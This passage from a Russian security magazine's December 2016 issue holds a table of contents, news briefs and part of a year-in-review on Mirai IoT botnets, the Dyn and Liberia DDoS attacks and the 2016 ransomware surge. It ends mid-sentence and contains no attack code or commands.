                                                             ДЕКАБРЬ 2016


              №215


Защищаем Android-апп    Прячем одни файлы       Разбираемся, как
от реверса, дебага         в других с помощью   устроено шифрование
и кражи                    стеганографии                 в Android





         Cover
          Story

                                Изучаем
                                двухфакторнуюВТОРОЙ                                аутентификацию
                                      Android, iOS
                                и Windows 10 MobileФАКТОР
                                            декабрь 2016
          № 215





  MEGANEWS
Всё новое за последний месяц

  Все самое интересное за 2016 год
Дайджест самых заметных и интересных событий за прошедший год

  Двойное подтверждение
Изучаем и взламываем двухфакторную аутентификацию Android, iOS и Windows 10 Mobile

  Тайные знаки
Изучаем утилиты для стеганографии и прячем одни файлы внутри других

  Прикладная некромантия
Как оживить, почистить и настроить старый компьютер

  Neon — новый экспериментальный браузер Opera Software
Обзор в скриншотах

 WWW2
Интересные веб-сервисы

  Карманный софт
Выпуск #26. Root

  Мобильный дайджест ноября
Смерть Cyanogen Inc, защищенный Tor и большой тест VPN-приложений

  Криптостойкие андроиды
Как работает полнодисковое и пофайловое шифрование в Android

  Дрессированный смартфон
Автоматизируем рутину с помощью Workflow, IFTTT и Launch Center Pro

  Пароль не нужен
Взламываем заблокированный iPhone, используя депонированный ключ

  Сказ о трех кнопках
Колонка Евгения Зобнина

  Обзор эксплоитов
Анализ новых уязвимостей

  В закромах Hacking Team
Исследуем исходные коды платформы Galileo

  Письма с сюрпризом
Эксплуатируем уязвимость в PHPMailer и фреймворках, которые его используют

  Ответы юриста
Как избежать ответственности за поиск уязвимостей

  Противоугонка для кода
Защищаем Android-приложение от реверса и дебага

  X-TOOLS
Софт для взлома и анализа безопасности

  Бесплатные антивирусы: последний бой
Тестируем Bitdefender, Clearsight, Rising Internet Security и Roboscan

  Reversing malware для начинающих
Часть 1. Практический анализ

  Самая интересная малварь за квартал
Крутые осенние угрозы для Linux, Win, IoT и Android

  Задачи на собеседованиях
Задачи от Waves Platform

  Красота из фрагментов
Как улучшить UI в Android c помощью класса Fragment

  Electron’ная музыка
Превращаем Soundcloud в мобильное приложение с помощью крутейшего фреймворка

  ][-исследование: куда уходит память
Разбираемся с memory leaks в Java

  В голове async? Тебе нужен await!
Новые асинхронные возможности Python 3

  Хардварный бейджик ZeroNights 2016
Как мы делали знаменитую матрешку

  SSH Tips’n’Tricks
20 советов по использованию SSH на все случаи жизни

  Домашний медиакомандир
Собираем домашний NAS-сервер с медиаплюшками для домашних клиентов

  Просто о сложном
Разбираем нестандартные варианты настройки nginx

  Идеальный почтовый сервер
Пробуем не огрести от спам-фильтров

  FAQ
Вопросы и ответы

  Титры
Кто делает этот журнал

                                         Мария «Mifrill» Нефедова
                                                       nefedova.maria@gameland.ru





PROJECT
WYCHEPROOF
Компания Google выпустила бесплатный инструментарий Project Wycheproof,
созданный для выявления проблем в популярных криптографических библио-
теках. Основная задача Wycheproof — помочь разработчикам, которые не яв-
ляются экспертами в области криптографии, находить слабые места и недо-
работки в различных имплементациях алгоритмов шифрования.
   Исходные коды проекта уже опубликованы на GitHub. Wycheproof написан
на Java и включает в себя более 80 тестов, которые помогут обнаружить баги
в самых популярных на сегодня алгоритмах: AES-EAX, AES-GCM, DH, DHIES,
DSA, ECDH, ECDSA, ECIES, RSA. Тесты способны выявить ряд распространен-
ных векторов атак, к примеру Bleichenbacher или атаки, связанные с invalid curve.
   «Чтобы понимать,  как реализовать криптографию безопасным обра-
зом, требуется освоить академическую литературу за десятки лет. С Project
Wycheproof разработчики и пользователи смогут проверить свои библиотеки
на предмет уязвимостей перед рядом известных атак, и для этого не придется
анализировать сотни научных публикаций и становиться криптографами», —
пишут разработчики Google в официальном блоге.


FLASH PLAYER ОСТАЕТСЯ ГЛАВНОЙ МИШЕНЬЮ
ЭКСПЛОИТ-КИТОВ

   Специалисты компании Recorded Future изучили работу различных наборов эксплоитов,
чтобы определить, какие эксплоиты были наиболее «ходовыми» в 2016 году. Вполне предска-
зуемо и с большим отрывом в этом рейтинге «победил» Adobe Flash Player.
141 набор эксплоитов проанализировали специалисты Recorded Future. Также для
исследования были изучены ИБ-блоги и ресурсы даркнета
6 из 10 самых эксплуатируемых уязвимостей были обнаружены в Adobe Flash Player
Самым популярным багом, который эксплуатировали чаще других, стала уязвимость CVE-
2016-0189 в Internet Explorer
Эксплоит для уязвимости CVE-2015-7645 в Adobe Flash Player был найден в составе сразу
семи разных эксплоит-китов

На графике — топ-10 самых популярных уязвимостей 2016 года.





PCILEECH
Шведский исследователь и пентестер Ульф Фриск (Ulf Frisk) создал прибор,
при помощи которого можно обойти шифрование FileVault 2, которое исполь-
зуется в устройствах Apple. Фриск назвал свою разработку PCILeech и под-
робно рассказал в блоге, что для создания прибора понадобится всего 300
долларов и опенсорсный софт.
   Написанный для атак proof of concept исследователь уже опубликовал
на GitHub. Там же можно найти подробные инструкции по созданию вредонос-
ного Thunderbolt-прибора и его прошивке. Фриск объясняет, что использовал
чип USB3380, но для проведения атаки этого недостаточно. Сам чип можно
приобрести за 15 долларов, но лучше найти макетную плату с уже установлен-
ным чипом. Искать Фриск советует на eBay, AliExpress, или обратить внимание
на решения компании BPlus Technology.
  По данным специалиста, точно работают платы USB3380-EVB mini-PCIe
и PP3380-AB PCIe, а вот ExpressCard EC3380-AB не подойдет. Фриск пишет,
что тестировал свою атаку на нескольких Macbook и Macbook Air, оснащенных
Thunderbolt 2. На более новых девайсах с USB-C тесты не проводились. Уязви-
мость была устранена 13 декабря 2016 года с выходом macOS 10.12.2.

 $14 000    46% 000 000                                 сайтов потенциально    превысила общая                                    опасны   стоимость биткойнов                                для пользователей
     В конце декабря 2016 года курс
                                                  Исследователи компании Menlo   биткойна к доллару резко поднялся на
                                                        Security изучили работу миллиона   5%, в результате чего криптовалюта
                                             самых популярных сайтов по версии   достигла максимальной стоимости за
                                                         Alexa. Как оказалось, опасности под-   три года. Тогда цена одного биткой-
                                                 стерегают пользователей буквально   на на бирже Bitstamp установилась
                                                на каждом втором сайте. Специали-   на уровне 875 долларов. Стоимость
                                               сты установили, что 46% всех сайтов   криптовалюты фактически удвоилась
                                               работают с уязвимым ПО, являются   по сравнению с началом года, когда
                                           фишинговыми или недавно допускали   биткойн стоил 435 долларов. В итоге
                                                    утечки данных. Так, различные уяз-   стоимость всех находящихся в обо-
                                               вимости в ПО имеют 36% сайтов. К   роте биткойнов превысила 14 мил-
                                                примеру, 70 тысяч ресурсов работа-   лиардов долларов, побив рекорд,
                                           ют на базе устаревшего nginx 1.8.0.   установленный в 2013 году, когда
                                        Еще 17% ресурсов вообще оказались   криптовалюта стоила 1163 доллара
                                               вредоносными. Исследователи выяс-   за один биткойн. 1 января 2017 года
                                                   нили, что наибольшую угрозу несут   курс и вовсе превысил порог 1000
                                                порносайты: 38 тысяч сайтов, попав-   долларов, но уже 5 января обвалился
                                           ших в категорию вредоносных, — это   на 20%, вернувшись к отметке 887,
                                             именно ресурсы для взрослых.   и продолжает снижаться.





                 «По масштабу самое знаковое и клю-
                   чевое событие — это блокировка соци-
                  альной сети LinkedIn. А если говорить по
                   звучанию и распространению, это бло-
                   кировка порнографического ресурса
                    Pornhub. По оценкам аналитиков, абсо-
                  лютно все пользователи Рунета об этом
                    знают».

                                                                                         о наиболее                                                              Глава Роскомнадзора Александр Жаров
                                                            знаковых событиях 2016 года в российском интернете





SANDBOXED TOR
BROWSER
10 декабря 2016 года разработчики Tor Browser предоставили версию браузе-
ра со встроенным механизмом сендобксинга. Пока что это ранняя «альфа» —
Sandboxed Tor Browser имеет версию 0.0.2 и работает только в Linux.
   Sandboxing, или «помещение в песочницу», — термин, которым обознача-
ют защитный механизм, призванный отделить процессы друг от друга. С точ-
ки зрения безопасности это означает, что процесс приложения будет отделен
от ОС и ограничен изолированным окружением — это не позволит злоумышлен-
никам добраться до ОС через эксплуатацию уязвимости в самом приложении.
   Практически все современные браузеры работают именно так. Chrome,
Firefox и Edge используют sandboxing, чтобы отделить браузер от систе-
мы. Tor Browser до недавнего времени этим похвастаться не мог, несмотря
на то что в его основе лежит Mozilla Firefox. Разработчики Tor прекрасно по-
нимали, что это недостаток, сказывающийся на безопасности, поэтому еще
в сентябре 2016 года начали работу над Sandboxed Tor Browser.
   Исходные коды разработки уже размещены в открытом доступе. Sandboxed
Tor Browser опирается на инструментарий bubblewrap, а также использует кон-
тейнеры seccomp-bpf и namespace.
   Разработчики пишут, что сейчас они ищут возможности создания версии
для macOS, а в отдаленном будущем также планируется версия для Windows.


ВЫМОГАТЕЛЬСКОЕ ПО СТАНОВИТСЯ ВСЕ ОПАСНЕЕ

   В конце 2016 года «Лаборатория Касперского» представила традиционные итоговые отчеты
о главных угрозах уходящего года. Одной из главных проблем, по мнению специалистов, стали
шифровальщики, которые продолжают завоевывать мир. В своем отчете исследователи приво-
дят печальную статистику, хорошо иллюстрирующую сложившуюся ситуацию.
62 новых семейства программ-вымогателей было найдено в 2016 году

Количество новых модификаций вымогателей выросло в 11 раз. В период с января по март
таковых насчитывалось 2900, но уже в июле — сентябре была достигнута отметка 32 091

С января по конец сентября число атак на компании увеличилось в три раза: если в январе
атаки проводились в среднем каждые две минуты, то в сентябре — каждые 40 секунд
Интенсивность атак на пользователей удвоилась: атаки проводились в среднем раз в 20
секунд в начале периода и раз в 10 секунд в его конце

Каждая пятая компания малого или среднего бизнеса, заплатившая выкуп, так и не получила
доступ к своим данным
67% жертв программ-вымогателей полностью или частично потеряли свои корпоративные
данные





HAVE I BEEN
PWNED?
В декабре 2016 года известный ИБ-эксперт и основатель сервиса «Have  I
Been Pwned?» Трой Хант сделал подарок всем любителям анализа и стати-
стики. Хант пишет, что к нему регулярно обращаются с просьбами дать доступ
к базе утечек и, разумеется, он всегда отвечает на такие запросы отказом. Од-
нако когда сервис отпраздновал свой третий день рождения, Хант все-таки
решил предоставить общественности доступ к огромному массиву собранных
за это время данных.
   Доступ предоставлен с одним условием: все данные были полностью обе-
зличены. Никакой личной информации, никаких подробностей. Эксперт низ-
вел всю огромную базу ресурса до файла размером 135 Мбайт, в котором со-
держится голая статистика. В частности, из него можно узнать, какие сервисы
были взломаны и какие данные утекли. Скачать файл можно из торрентов.
  В комментариях к исходному посту пользователи выложили множество
собственных графиков и визуализаций, созданных на основе опубликованной
информации.
  87
 000   сайтов заблокировал
                                  рынка занимает     Роскомнадзор   1%                             новейший Android Nougat        в 2016 году
     В конце 2016 года представители            В начале января 2017 года специ-
   Роскомнадзора представили итоговый           алисты Google представили обнов-
    отчет. По данным ведомства, за по-            ленную статистику для платформы
   следние 12 месяцев в единый реестр             Android. Как оказалось, вышедшая
   запрещенной информации попали 86            в августе прошлого года Android
   825 URL с противоправной информа-            Nougat пока не заняла даже одного
   цией. В итоге около 52 000 противо-            процента рынка: суммарная доля
   законных материалов были удалены             версий 7.0 и 7.1 составляешь лишь
   самими администраторами ресурсов            0,7%. Самой распространенной вер-
   и около 34 500 адресов (40%) были             сией Android по-прежнему остается
   заблокированы операторами свя-               устаревшая Lollipop (5.0–5.1), зани-
    зи. В 2016 году на горячую линию            мающая 33,4% рынка. Следом идут
   Роскомнадзора поступило 127 тысяч            версии Android Marshmallow (6.0), ко-
   сообщений о наличии в Сети запре-             торой принадлежит 29,6%, и Android
   щенной информации. Эта цифра на                KitKat (4,4%), чья доля равна 22,6%.
   30% выше прошлогодней. Кроме того,         И только теперь, в начале 2017 года,
   в 2016 году были заблокированы 20             из статистики исключили Android
   мобильных приложений, распростра-             Froyo (2.2). Словом, в стане Android
   нявших экстремистские материалы.             все по-старому.





COMMA NEO
Проект Comma One, в рамках которого бывший хакер Джордж Хоц разрабаты-
вал ИИ для беспилотных автомобилей, стал опенсорсным. Теперь он называ-
ется Open Pilot, а исходники уже опубликованы на GitHub.
  Джордж Geohot Хоц наверняка знаком многим нашим читателям: в сем-
надцать лет он сумел джейлбрейкнуть iPhone, а затем Sony PlayStation 3, из-за
чего компания Sony долго пыталась юридически преследовать хакера. В по-
следнее время Хоц занимался проектом Comma One и с нуля создал систему,
которая может превратить обычный автомобиль в беспилотный.
   Хоц много рассказывал о своем проекте инвесторам и журналистам и пла-
нировал выйти на рынок с комплектами Comma One, предназначенными
для самостоятельной установки на автомобили. Один комплект должен был
стоить 999 долларов, а устанавливать его можно лишь на некоторые модели
Honda Civic и Acura.
  На этих планах Хоцу пришлось поставить крест, когда ему поступило пись-
мо из Национального управления по безопасности движения автотранспорта
США, в котором чиновники потребовали предоставить все данные о Comma
One. В NHTSA всерьез обеспокоились из-за разработки Хоца и ее возможно-
го несоответствия стандартам безопасности. В результате продажи Comma
One так и не стартовали, и Хоц заморозил проект, выложив все наработки в от-
крытый доступ.


  Прототип Comma Neo.
  Фото The Verge





Без аппаратной составляющей Open Pilot практически бесполезен, поэтому
Хоц также представил «аппаратную платформу для исследовательской деятель-
ности» Comma Neo. Собрать такое устройство можно при помощи 3D-принте-
ра и смартфона OnePlus 3. Автор опубликовал подробный мануал (pdf).



                  «Министерство культуры поддерживает
                   резкое ужесточение антипиратского за-
                    конодательства, соответствующие пред-
                  ложения мы разрабатываем с депутатами
                   Государственной думы. Штрафы — это
                 лишь одна из предлагаемых мер. Если
                  более жесткий вариант антипиратского
                    законодательства, принятый во всем ци-
                  вилизованном мире, не будет у нас при-
                     нят и не будет исполняться, можно будет
                    поставить крест на существовании авто-
                      ра, творца как институции, способной за-
                   рабатывать себе на хлеб».

                                                                        о возможном введении штрафов                                   Министр культуры РФ Владимир Мединский
                                                                                  за скачивание пиратского контента
ВСЕ САМОЕ ИНТЕРЕСНОЕ
 ЗА 2016 ГОД   ДАЙДЖЕСТ САМЫХ ЗАМЕТНЫХ И ИНТЕРЕСНЫХ
        СОБЫТИЙ ЗА ПРОШЕДШИЙ ГОД





                                        Мария «Mifrill» Нефедова
                                                     nefedova.maria@gameland.ru



Пришло время подвести итоги 2016 года. Здесь мы
не станем писать, что страшные русские хакеры взломали
все, до чего сумели дотянуться (включая выборы в США),
зато расскажем о по-настоящему интересных и значимых
событиях минувшего года.

ИНТЕРНЕТ УЯЗВИМЫХ ВЕЩЕЙ
На протяжении последних нескольких лет ИБ-специалисты постоянно гово-
рят о небезопасности интернета вещей (Internet of things, IoT). Производите-
ли всевозможных умных девайсов мало задумываются о защищенности своих
продуктов, поставляя на рынок устройства с бэкдорами, жестко закодирован-
ными учетными данными, открытыми по умолчанию портами и так далее. Глядя
на это, эксперты предрекали, что в скором будущем интернет вещей принесет
серьезную головную боль, особенно когда IoT-устройств станет по-настояще-
му много.
   Еще в прошлом году исследователи рассказывали о совсем не теоретиче-
ских взломах умных кофеварок, весов, камер и даже детских игрушек, пытаясь
привлечь внимание к проблеме. И хотя первые ботнеты из камер наблюдения
и роутеров были обнаружены далеко не в 2016 году, настоящий хаос обрушил-
ся на мир IoT осенью 2016 года, когда были опубликованы исходные коды мал-
вари Mirai.
   Все началось в середине сентября, когда известный журналист Брайан
Кребс в очередной раз насолил хакерскому андеграунду. На этот раз Кребс
опубликовал в своем блоге обличающую статью о сервисе DDoS-атак на за-
каз — vDos. Кребс рассказал, что операторы сервиса заработали больше 600
тысяч долларов за два года, произведя более 150 тысяч атак. Кроме того, жур-
налист сумел установить личности хакеров, перечислил в своей статье IP-а-
дреса серверов злоумышленников и описал работу vDos очень детально. По-
сле этого сайт журналиста подвергся серии DDoS-атак, пиковая мощность
которой достигала 620 Гбит/с.
   Тогда специалисты компании Akamai, которая на протяжении нескольких
лет предоставляла Кребсу защиту и хостинг, сообщили, что атака осуществля-
лась при помощи пакетов GRE (Generic Routing Encapsulation). Также экспер-
ты заметили, что большинство мусорного трафика генерировали различные
IoT-устройства: роутеры, IP-камеры, DVR и так далее.
   Разумеется, месть DDoS’еров не заставила Брайана Кребса замолчать.
Уже в начале октября он обратил внимание на то, что Anna-senpai (автор мал-
вари, на базе которой был создан атаковавший сайт Кребса ботнет) опубли-
ковал исходные коды своего трояна на портале Hack Forums. Раньше этот
троян был известен под разными именами (Bashlite, GayFgt, LizKebab, Torlus,
Bash0day и Bashdoor), но чаще всего его называли Mirai.





В сообщении, опубликованном на Hack Forums, Anna-senpai взял на себя от-
ветственность за атаки на сайт Кребса и заявил, что все равно не планиро-
вал заниматься DDoS-атаками долго. Когда DDoS против сайта журналиста
привлек к его ботнету много внимания, а число ботов стало снижаться, Anna-
senpai решил, что пора сделать подарок всем скрипт-кидди и опубликовать
исходные коды Mirai, «чтобы у них появилась хоть какая-то альтернатива qbot».
Некоторые эксперты полагали, что публикация исходных кодов Mirai — это
даже хорошо, ведь если каждый скрипт-кидди захочет создать собственный
ботнет, значит, в одних руках будет сосредоточен контроль над меньшим чис-
лом устройств. Однако все обернулось не совсем так, как ожидалось.
    Mirai работает очень просто: атакует IoT-устройства и брутфорсит их че-
рез Telnet. В коде вредоноса жестко закодированы более 60 разных комби-
наций дефолтных логинов и паролей. В настоящее время ботнетов на основе
Mirai начитывается немало, равно как и вредоносов-подражателей (среди них
NyaDrop, Hajime и IRCTelnet). По данным независимого эксперта MalwareTech,
который следит за ситуацией вокруг Mirai с самого начала, в конце дека-
бря 2016 года Mirai было заражено более 2,5 миллиона устройств по все-
му миру. Отслеживать, как обстоят дела, можно через специальный сайт,
созданный исследователем, деятельность ботнетов также транслируется
в специальный Twitter-аккаунт.
   После того как исходные коды малвари стали достоянием общественно-
сти, Mirai-ботнеты начали набирать «массу», и среди них особенно выделяет-
ся один, известный как «ботнет № 14»: именно такой ID был присвоен ботнету
трекером MalwareTech. В конце октября 2016 года жители США и европейских
стран (включая Россию) на собственном опыте смогли прочувствовать, что ин-
тернет вещей — это проблема. Тогда Mirai-ботнет атаковал DNS-провайдера
Dyn, из-за чего с перебоями работали социальные сети, новостные сайты, по-
пулярные стриминговые сервисы. Практически недоступны оказались Twitter,
Reddit, Yelp, Imgur, PayPal, Airbnb, Pinterest, Shopify, Soundcloud, Spotify, GitHub,
Heroku, Etsy, Box, Weebly, Wix, Squarespace, CPAN, NPM, Basecamp, Twilio,
Zoho, HBO, CNN, Starbucks, Yammer. Хотя ответственность за эту атаку офи-
циально не взяла на себя ни одна хакерская группа, исследователи полагают,
что она была делом рук ботнета № 14.
   При этом существует версия, что целью хакеров был отнюдь не сам Dyn,
а сеть PlayStation Network. Дело в том, что именно 21 октября 2016 года, в день
атаки, состоялся релиз Battlefield 1, и Dyn мог оказаться просто «побочным
ущербом», так как PSN использует NS-серверы Dyn (ns00.playstation.net, ns01.
playstation.net, ns02.playstation.net и так далее).
   Однако атака на провайдера Dyn стала лишь первым звеном в цепочке не-
приятных событий. Так, в ноябре 2016 года ИБ-эксперт Кевин Бомонт (Kevin
Beaumont) заметил, что ботнет № 14 атаковал небольшую африканскую стра-
ну Либерию. В своем блоге Бомонт заявил, что атака исходила от ботнета
с самым большим потенциалом, какой он когда-либо видел (один из тран-
зитных провайдеров подтвердил исследователю, что поток трафика доходил
до 500 Гбит/с). Хотя этот инцидент практически оставил страну без интернета,
он едва не ускользнул от внимания экспертов.
   Дело в том, что за интернет в Либерии, по сути, отвечает пара телеком-
муникационных компаний, владеющих единственным на всю страну подво-
дным оптоволоконным кабелем. До 2011 года редкие жители страны, кото-
рые пользовались интернетом, вынуждены были делать это через спутник.
Но затем вдоль западного побережья Африки был проложен оптоволоконный
кабель ACE, который в общей сложности обслуживает 23 страны, при этом его
общая пропускная способность равняется 5,1 Тбит/с. Бомонт и эксперты Level
3 Communications заметили, что ботнет № 14 прицельно атаковал либерий-
ские компании, которым принадлежит кабель, отвечающий за интернет в стра-
не (атака привела к практически полному падению интернета в Либерии).
По мнению экспертов, операторы ботнета использовали Либерию как полигон
и таким образом проводили тестирование.





После этого в конце 2016 года проблемы начались уже у интернет-провайде-
ров. Серьезные неприятности с оборудованием и подключением к интернету
сначала заметили пользователи телекоммуникационной компании Deutsche
Telekom и ирландского провайдера Eircom, а затем такая же беда постигла
и британских провайдеров UK Postal Office, TalkTalk и KCOM. Виной всему ста-
ла новая разновидность Mirai, также известная под названием Annie.
   За появление этой модификации малвари ответственны хакеры под псев-
донимами BestBuy и Popopret. Они создали Mirai-ботнет, который, по их соб-
ственным словам, насчитывал более 4,8 миллиона ботов еще в начале дека-
бря 2016 года. Судя по всему, это и есть тот самый ботнет № 14, хотя BestBuy
и Popopret отказываются как-либо комментировать данный вопрос. Зато зло-
умышленники охотно дают другие комментарии прессе и утверждают, что их
модификация Mirai скомпрометировала уже 3,2 миллиона роутеров.
   Активность именно этого вредоноса случайно спровоцировала перебои
в работе оборудования названных провайдеров. Дело в том, что Annie не толь-
ко умеет брутфорсить IoT-устройства через Telnet, но также атакует роутеры
через порт 7547, используя для этого протоколы TR-064 и TR-069. Данная
уязвимость была выявлена и описана в устройствах ZyXEL Eir D1000 в начале
ноября 2016 года, но вскоре стало ясно, что эта проблема распространяется
на куда более широкий спектр устройств. Хотя, стоит сказать, даже сами ха-
керы не до конца понимают, что приводило к сбоям в работе роутеров. Злоу-
мышленники сообщили, что не намеревались саботировать работу устройств
и портить жизнь сотням тысяч пользователей, и посоветовали провайдерам
закупать аппаратуру понадежнее.
   На достигнутом операторы крупнейшего Mirai-ботнета останавливаться
явно не собираются. В конце декабря специалисты китайской компании Qihoo
360 NetLab, а также эксперты OpenDNS обнаружили еще одну модификацию
Annie, которая использовала DGA (Domain Generation Algorithm) для резерв-
ной связи с управляющими серверами. DGA-механизмы, как правило, находят
в составе «профессионально» написанной малвари: это могут быть, напри-
мер, сложные бэкдоры, которые используются для кибершпионажа, топовые
вымогатели, такие как Locky или CryptoLocker. Увидеть подобное в коде Mirai
эксперты не ожидали. Впрочем, вскоре DGA пропал из кода малвари и был
отключен. Хакеры пояснили, что это была лишь временная мера («Нас обло-
жили Level 3 и другие. Нужно было усилить контроль на несколько дней, вот
и все») и использовать механизмы DGA постоянно они не планируют. Вместо
этого BestBuy сообщил, что для сокрытия работы ботнета будет использовать-
ся Tor, — «больше не нужно платить тысячам провайдеров и хостеров, нужен
только один надежный сервер».
   Стоит отметить, что такой «успех» Mirai во многом заслуга самих произво-
дителей IoT-устройств, которые продолжают поставлять на рынок дырявые,
как сито, продукты. Более того, многие эксперты полагают, что в данной си-
туации рынок не может справиться с проблемой самостоятельно. К примеру,
известный криптограф и ИБ-специалист Брюс Шнайер, в конце года выступая
перед конгрессом США, заявил, что государству необходимо регулировать
рынок IoT, так как самостоятельно решить эту проблему рынок не в состоянии:
   «В наши дни интернет оказывает прямое, физическое влияние на реальный
мир. Интернет вещей принес компьютеризацию и соединил десятки миллио-
нов устройств по всему миру. Мы соединяем автомобили, дроны, медицинские
устройства и домашние термостаты. Это становится опасным. Рынок не может
справиться с этим [самостоятельно]. Продавцам и покупателям все равно.
Правительство должно вмешаться. Это сбой рынка, который рынок не испра-
вит сам».
   К сожалению, Шнайер, судя по всему, абсолютно прав. Единицы компа-
ний готовы принять превентивные меры и задуматься о безопасности сво-
их IoT-решений всерьез, как это недавно сделала компания HP, сообщив,
что «отказывается от устаревших и мало поддерживаемых интерфейсов, в том
числе портов, протоколов и наборов шифров», а также по умолчанию отклю-
чает FTP и Telnet в своих продуктах. Куда чаще производители выпускают пат-
чи post factum, с огромной задержкой, когда информацию об уязвимостях уже
опубликовали в открытом доступе и «отступать некуда».
   Хуже того, рынок наводнен практически безымянными white-label устрой-
ствами (дешевыми DVR, камерами, роутерами), которые содержат огром-
ное количество багов, но исправлять их вообще не станет никто. Например,
специалисты компании Cybereason в декабре 2016 года обнаружили неустра-
нимые проблемы в десятках моделей IP-камер. Исследователи открыто напи-
сали в докладе о том, что компании, которые штампуют дешевые IoT-продук-
ты, совсем не заинтересованы выпускать патчи, а порой просто не могут этого
сделать, так как у их девайсов нет никаких механизмов для обновления. Задача
таких производителей — поставить устройство на рынок как можно быстрее,
и о безопасности они думают меньше всего. Исследователи даже не сумели
понять, кому и куда нужно сообщать о найденных багах. Большая часть камер,
купленных на Amazon и eBay для проведения эксперимента, не имела вооб-
ще никакой информации о производителе. «Единственный способ удостове-
риться, что камера более не уязвима для наших эксплоитов, — выбросить ее.
Серьезно», — резюмировали специалисты в своем отчете. И этот вывод,
включенный экспертами в официальную публикацию, отлично характеризует
текущее положение дел в сфере IoT в целом.


Другие интересные материалы по данной теме:
• Специалист создал эксплоит, позволяющий взломать 35 моделей камер на-
  блюдения с помощью одного GET-запроса
• Сводная группа исследователей взломала IoT-лампочки Philips Hue. Иссле-
  дователи запустили в полет оснащенный специальным червем дрон, кото-
  рый заставил лампочки сигналить SOS морзянкой
• DDoS-атака вывела из строя умную систему теплоснабжения
  в небольшом финском городе
• За пользователями в наше время шпионят даже вибраторы
• По-настоящему смертельные уязвимости были
  выявлены в кардиостимуляторах и кардиодефибрилляторах



ЧУМА 2K16 — ШИФРОВАЛЬЩИКИ
Давно прошли те времена, когда вирусы писали шутки ради. В наши дни мал-
варь создают преимущественно для того, чтобы заработать денег. И прибыль
хакерам приносят отнюдь не только банковские трояны, позволяющие похи-
щать средства с чужих счетов. Ресурсы чужой системы можно использовать
для майнинга криптовалюты или DDoS-атак, можно показывать жертве рекла-
му, устанавливать сторонние приложения и получать за это проценты, можно
обманом вынудить пользователя позвонить на горячую линию фиктивной тех-
нической поддержки. Вариантов множество, но в последние годы особенную
популярность в киберкриминальной среде приобрело вымогательское ПО са-
мых разных форм.
   «Ваши файлы были зашифрованы!» Увидеть такое сообщение — худ-
ший кошмар 2016 года. В этом году шифровальщики стали головной болью
не только для простых пользователей, но и для крупных компаний, медицин-
ских учреждений, операторов транспортных систем. Рансомварь сейчас пере-
живает по-настоящему взрывной рост, что подтверждают, к примеру, пугаю-
щие цифры из готового отчета «Лаборатории Касперского»:
•  возникло 62 новых семейства программ-вымогателей;
•  количество новых модификаций вымогателей выросло в 11 раз — с 2900
   в период с января по март до 32 091 в июле — сентябре;
•  с января по конец сентября число атак на компании увеличилось в три раза:
   если в январе атаки проводились в среднем каждые две минуты, то в сентя-
   бре — уже каждые сорок секунд;
•  интенсивность атак на пользователей удвоилась: атаки проводились в сред-
   нем раз в двадцать секунд в начале периода и раз в десять секунд в его конце;
•  каждая пятая компания малого или среднего бизнеса, заплатившая выкуп,
    так и не получила доступ к своим данным.

Все новые и новые вымогатели появляются быстрее, чем грибы после дождя,
но пальму первенства в этом году достаточно прочно удерживали такие угро-
зы, как Locky, CTB-Locker, TeslaCrypt, CryptXXX, CryptoWall, Crysis, Cerber.
   Кроме того, в 2016 году специалисты отметили рост популярности RaaS
(Ransomware as a Service, «Вымогатель как услуга»). Все чаще злоумышленни-
ки предпочитают не заниматься распространением вымогательского ПО лично
и создают специализированные сервисы для своих «коллег». Сегодня любой,
у кого есть деньги, может взять готовое вредоносное ПО в аренду и получить
в свое распоряжение всю необходимую для его работы инфраструктуру, удоб-
ную админку и полноценную техническую поддержку.
   Масштабы этого бизнеса хорошо иллюстрирует доклад, представлен-
ный в августе 2016 года специалистами компании Check Point. Отчет посвя-
щен деятельности шифровальщика Cerber — одной из крупнейших в мире
RaaS-«франшиз» на сегодня. По данным экспертов, злоумышленники, аренду-
ющие Cerber, запустили по всему миру более 160 активных кампаний с общим
ежегодным прогнозируемым доходом около 2,3 миллиона долларов. Каж-
дый день в среднем запускаются восемь новых кампаний. Только в июле 2016
года исследователи обнаружили около 150 тысяч жертв шифровальщика в 201
стране и регионе.
   Общая «выручка» за июль составила порядка 195 тысяч долларов, из них 78
тысяч долларов осели в карманах разработчиков малвари, а остальное разде-
лили между собой аффилиаты. То есть авторы Cerber зарабатывают порядка
946 тысяч долларов год.





Из сравнительно новых веяний в сфере шифровальщиков можно также отме-
тить появление таких угроз, как Petya и Satana. Помимо забавных названий, эти
криптовымогатели отличаются от других подобных вредоносов тем, что они
не просто шифруют файлы, а проникают в MBR (Master Boot Record), чтобы за-
тем воспрепятствовать нормальному запуску системы.
   Также немало шума в этом году наделали шифровальщики, построенные
на основе опенсорсных решений. Так, еще в начале года турецкий иссле-
дователь Ютку Сен (Utku Sen) создал и опубликовал на GitHub «в образова-
тельных и исследовательских целях» сразу два криптовымогателя — Hidden
Tear и EDA2. Разумеется, это оказалось не слишком хорошей идеей, несмо-
тря на все заверения разработчика. Тот считал, что поместил в код достаточ-
но надежные «предохранители», которые не позволят злоумышленникам взять
«учебную» малварь на вооружение. Но вскоре в Сети стали появляться осно-
ванные на его работах настоящие вымогатели.
   Хотя шифрование первого вредоноса, основанного на Hidden Tear, было
взломано самим Сеном, который действительно заложил в свой код бэкдор,
дальше события развивались совсем не так радужно. Со вторым «учебным»
вредоносом Сен промахнулся, поместив бэкдор в панель управления EDA2,
а не в код самой малвари. Как оказалось, иногда командные серверы хаке-
ров могут располагаться на бесплатном хостинге. И если администрация бес-
платного хостинга получает жалобы на какой-то аккаунт, этот аккаунт не про-
сто блокируется, зачастую вся информация нарушителя сразу же удаляется.
А вместе с ней и ключи шифрования жертв. Именно это произошло с шифро-
вальщиком Magic, основанным на EDA2. Взломать шифрование и спасти фай-
лы жертв не удалось, так как хостер полностью стер все данные. В итоге Сен
был вынужден извиниться перед всеми пострадавшими и удалить с GitHub код
вымогателя.
   Вскоре история Ютку Сена получила неожиданное продолжение. Разра-
ботчика принялись шантажировать настоящие хакеры, требуя у него также уда-
лить с GitHub исходники малвари Hidden Tear. В итоге Сен договорился со зло-
умышленниками. Те пообещали бесплатно расшифровать файлы всех жертв
Magic, а турецкий исследователь действительно изъял Hidden Tear из открыто-
го доступа и признался, что полностью осознал все свои ошибки. Вскоре по-
сле этого, в феврале 2016 года, эксперты «Лаборатории Касперского» сооб-
щили, что на базе опенсорсной малвари Сена было создано по меньшей мере
24 настоящих шифровальщика.
   Как ни странно, Сен не единственный, кому пришло в голову создать полно-
ценный работающий вымогатель с настоящим модулем шифрования и откры-
то опубликовать исходники. В ноябре 2016 года внимание экспертов привлек
